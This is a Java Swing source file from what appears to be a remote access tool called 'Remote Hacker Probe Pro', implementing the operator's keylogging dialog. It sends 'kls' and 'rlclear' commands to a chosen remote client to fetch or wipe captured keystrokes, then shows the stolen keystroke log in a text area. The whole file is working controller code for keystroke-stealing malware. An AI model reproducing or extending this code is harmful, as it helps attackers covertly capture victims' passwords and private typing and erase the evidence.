package rhp;

import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import org.fife.ui.rsyntaxtextarea.RSyntaxTextArea;
import org.fife.ui.rsyntaxtextarea.SyntaxConstants;
import org.fife.ui.rtextarea.RTextScrollPane;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JLabel;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.event.ActionEvent;

public class Keylogger extends JDialog {

	private final JPanel contentPanel = new JPanel();
	public static int CLIENT_ID;
	public static String keylogFilename;
	public static Boolean getKeylogs = false;
	
	public static String FileContent(String filePath) 
    {
        StringBuilder contentBuilder = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) 
        {
 
            String sCurrentLine;
            while ((sCurrentLine = br.readLine()) != null) 
            {
                contentBuilder.append(sCurrentLine).append("\n");
            }
        } 
        catch (IOException e) 
        {
            e.printStackTrace();
        }
        return contentBuilder.toString();
    }

	void RefreshKeylogs()
	{
		Server.SendData(Server.Clients.get(CLIENT_ID), "kls");
		ServerThread.WaitForReply();
		dispose();
	}
	/**
	 * Create the dialog.
	 */
	public Keylogger() {
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe Pro | Keylogging");
		setBounds(100, 100, 654, 430);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		
		  RSyntaxTextArea textArea = new RSyntaxTextArea(20, 60);
	      textArea.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_NONE);
	      textArea.setCodeFoldingEnabled(true);
	      RTextScrollPane sp = new RTextScrollPane(textArea);
		JLabel lblNewLabel = new JLabel();
		lblNewLabel.setText("Viewing Keylogs : " + keylogFilename );
		GroupLayout gl_contentPanel = new GroupLayout(contentPanel);
		gl_contentPanel.setHorizontalGroup(
			gl_contentPanel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addComponent(sp, GroupLayout.DEFAULT_SIZE, 626, Short.MAX_VALUE)
					.addGap(2))
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addComponent(lblNewLabel)
					.addContainerGap())
		);
		gl_contentPanel.setVerticalGroup(
			gl_contentPanel.createParallelGroup(Alignment.TRAILING)
				.addGroup(gl_contentPanel.createSequentialGroup()
					.addContainerGap()
					.addComponent(lblNewLabel)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(sp, GroupLayout.DEFAULT_SIZE, 318, Short.MAX_VALUE)
					.addGap(5))
		);
		contentPanel.setLayout(gl_contentPanel);
		{
			JPanel buttonPane = new JPanel();
			buttonPane.setLayout(new FlowLayout(FlowLayout.RIGHT));
			getContentPane().add(buttonPane, BorderLayout.SOUTH);
			{
				JButton okButton = new JButton("Clear Keylogs");
				okButton.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						Server.SendData(Server.Clients.get(CLIENT_ID), "rlclear");
						ServerThread.WaitForReply();
						textArea.setText("");
						lblNewLabel.setText("");
						dispose();
					}
				});
				okButton.setActionCommand("OK");
				buttonPane.add(okButton);
				getRootPane().setDefaultButton(okButton);
			}
			{
				JButton btnNewButton = new JButton("Refresh");
				btnNewButton.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						RefreshKeylogs();
					}
				});
				buttonPane.add(btnNewButton);
			}
		}
		
		String keylogs = FileContent(keylogFilename);
		textArea.setText(keylogs);
		
		addWindowListener(new WindowAdapter() {
			@Override
		    public void windowOpened(WindowEvent we) {
				MainWindow.HaltAllSystems();
		    }
			
			@Override
			public void windowClosed(WindowEvent we) {
				MainWindow.EnableAllSystems();
			}
		});
	}
}